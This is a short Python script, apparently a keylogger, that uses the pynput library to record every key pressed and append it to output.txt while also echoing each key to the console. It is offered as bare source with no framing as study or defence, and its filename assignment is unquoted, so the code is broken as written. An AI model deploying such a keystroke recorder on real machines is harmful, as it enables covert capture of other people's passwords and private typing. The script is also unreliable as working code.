from pynput import keyboard
import time
output_file = output.txt
def on_key_press(key):
    try:
        with open(output_file, "a") as file:
            file.write(f"{key}")
        print(f"Key {key.char} pressed")
    except AttributeError:
        with open(output_file, "a") as file:
            file.write(f"\n{key}")
        print(f"Special key {key} pressed")

# Create a listener that monitors keyboard events
with keyboard.Listener(on_press=on_key_press) as listener:
    listener.join()  # Start listening